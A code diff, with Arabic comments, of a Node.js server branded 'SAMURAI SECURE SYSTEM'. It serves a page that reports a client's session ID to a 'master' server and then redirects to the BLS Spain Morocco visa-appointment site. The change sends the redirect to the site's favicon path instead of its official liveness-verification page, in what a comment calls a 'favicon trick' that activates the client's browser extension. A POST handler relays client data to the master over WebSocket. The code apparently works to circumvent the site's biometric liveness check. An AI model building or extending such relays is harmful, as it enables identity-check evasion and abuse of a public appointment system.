@@ -11,7 +11,7 @@ const server = http.createServer((req, res) => {
 
     if (req.method === 'OPTIONS') { res.writeHead(204); res.end(); return; }
 
-    // 🔥 واجهة الكلاينت على سيرفر Railway لتجنب التوجيه لصفحة تسجيل الدخول
+    // 🔥 التوجيه الذكي لخدعة الـ Favicon الخاصة بإضافة العميل
     if (req.method === 'GET' && req.url.startsWith('/liveness')) {
         res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
         res.end(`
@@ -32,7 +32,7 @@ const server = http.createServer((req, res) => {
             <body>
                 <div class="card">
                     <h1>SAMURAI SECURE SYSTEM</h1>
-                    <p id="status">INITIALIZING SECURE LIVENESS CHANNEL...</p>
+                    <p id="status">ESTABLISHING SECURE CONNECTION...</p>
                     <div class="spinner"></div>
                 </div>
 
@@ -44,17 +44,17 @@ const server = http.createServer((req, res) => {
                     if (sessionParam) {
                         const cleanSession = sessionParam.split(',')[0];
 
-                        // إعلام الماستر أن العميل دخل للرابط
+                        // إعلام الماستر أن العميل فتح الرابط
                         fetch(SERVER_URL, {
                             method: 'POST',
                             headers: { 'Content-Type': 'application/json' },
                             body: JSON.stringify({ type: "CLIENT_CONNECTED", session_id: cleanSession })
                         }).catch(e => {});
 
-                        // إعادة توجيه ذكية نحو الصفحة الرسمية مع الحفاظ على البارامترات
+                        // التوجيه إلى مسار الفافيكون الخاص بالموقع لتبدأ إضافة العميل بالعمل فورا
                         setTimeout(() => {
-                            window.location.replace("https://www.blsspainmorocco.net/MAR/appointment/LivenessRequest?session=" + encodeURIComponent(sessionParam));
-                        }, 1500);
+                            window.location.replace("https://www.blsspainmorocco.net/assets/images/favicon.png?session=" + encodeURIComponent(sessionParam));
+                        }, 1200);
                     } else {
                         document.getElementById('status').innerText = "ERROR: INVALID SESSION CODE";
                     }
@@ -65,7 +65,7 @@ const server = http.createServer((req, res) => {
         return;
     }
 
-    // استقبال البيانات من العميل وتمريرها للماستر عبر الـ WebSocket
+    // استقبال البيانات من العميل وتوجيهها للماستر عبر الـ WebSocket
     if (req.method === 'POST') {
         let body = '';
         req.on('data', chunk => { body += chunk.toString(); });
